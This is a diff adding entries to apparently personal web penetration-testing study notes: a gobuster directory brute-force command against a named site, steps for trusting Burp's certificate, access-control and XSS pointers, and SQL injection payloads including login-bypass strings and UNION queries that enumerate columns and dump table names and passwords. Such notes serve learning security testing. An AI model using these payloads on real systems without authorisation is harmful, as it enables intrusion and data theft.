@@ -45,3 +45,37 @@ google dorking:
 
 Directory Brute Forcing
   gobuster dir -u https://semicolonlb.com -w /usr/share/wordlists/dirb/big.txt
+
+http://burp // download certificate
+  in browser
+    setting, security and privacy
+      security
+        manage device certificate
+          trusted root certification authorities
+            import
+              next
+                browser
+                  certificate
+
+attacking access controls
+  vertical, horizonal, context-dependent (ex: after paying I can't update the cart)
+
+xss
+  use html events onmouseover, onmouseout, ...
+
+sql injection
+  error based:
+    admin'--
+    username='' OR 1=1
+  union based:
+    select course_title from courses where instructor='majd' union select password from users--' and published = 1
+    same number of columns
+    same data types
+    same order
+    union select null --
+    union select null,null --
+    ... , keep trying until the query succeed
+    to determine the datatype of each column
+      union select 'a', null,null --
+      to determine the columns and the tabless names:
+      union select table_name, column_name, null from information_schema.columns --
